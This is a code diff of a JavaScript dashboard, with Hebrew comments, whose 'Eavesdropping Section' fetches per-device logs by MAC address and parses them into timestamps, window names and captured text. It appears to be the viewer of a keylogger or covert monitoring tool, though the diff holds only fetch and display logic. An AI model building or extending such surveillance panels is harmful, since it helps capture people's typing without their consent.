@@ -233,15 +233,16 @@ async function saveSettings() {
 // Eavesdropping Section
 async function fetchLogs(mac) {
     const url = `${SERVER_URL}/api/data/files`;
-    const formattedMac = mac.replaceAll(':', '_'); // החלפת נקודותיים בקו תחתי
     try {
         const response = await fetch(url, {
             method: 'GET',
-            headers: { 'Content-Type': 'application/json', 'mac-address': formattedMac }
+            headers: { 'Content-Type': 'application/json', 'mac-address': mac.replaceAll(':', '_') }
         });
         if (!response.ok) throw new Error('שגיאה בטעינת ההאזנות');
-        originalLogs = await response.json();
-        parsedLogArray = parseLogs(originalLogs);
+        const logs = await response.json();
+        console.log("לוגים שהתקבלו:", logs);
+        originalLogs = logs;
+        parsedLogArray = parseLogs(logs);
         populateWindowList(parsedLogArray);
         displayLogs(parsedLogArray);
     } catch (err) {
@@ -250,25 +251,20 @@ async function fetchLogs(mac) {
     }
 }
 
-function parseLogs(logObject) {
+function parseLogs(logArray) {
     const result = [];
-    for (let timestamp in logObject) {
-        if (logObject.hasOwnProperty(timestamp)) {
-            const [dmy, hm] = timestamp.split(' ');
-            const [day, month, year] = dmy.split('/');
-            const isoDate = `${year}-${month}-${day}`;
-            const logsArray = logObject[timestamp];
-            const structuredLogs = [];
-            logsArray.forEach(item => {
-                for (let windowName in item) {
-                    if (item.hasOwnProperty(windowName)) {
-                        structuredLogs.push({ windowName, text: item[windowName] });
-                    }
-                }
-            });
-            result.push({ fullDateStr: timestamp, date: isoDate, time: hm, logs: structuredLogs });
-        }
-    }
+    logArray.forEach(entry => {
+        const timestamp = Object.keys(entry)[0];
+        const [dmy, hm] = timestamp.split(' ');
+        const [day, month, year] = dmy.split('/');
+        const isoDate = `${year}-${month}-${day}`;
+        const logsArray = entry[timestamp];
+        const structuredLogs = logsArray.map(item => {
+            const [windowName, text] = Object.entries(item)[0];
+            return { windowName, text };
+        });
+        result.push({ fullDateStr: timestamp, date: isoDate, time: hm, logs: structuredLogs });
+    });
     return result;
 }
 
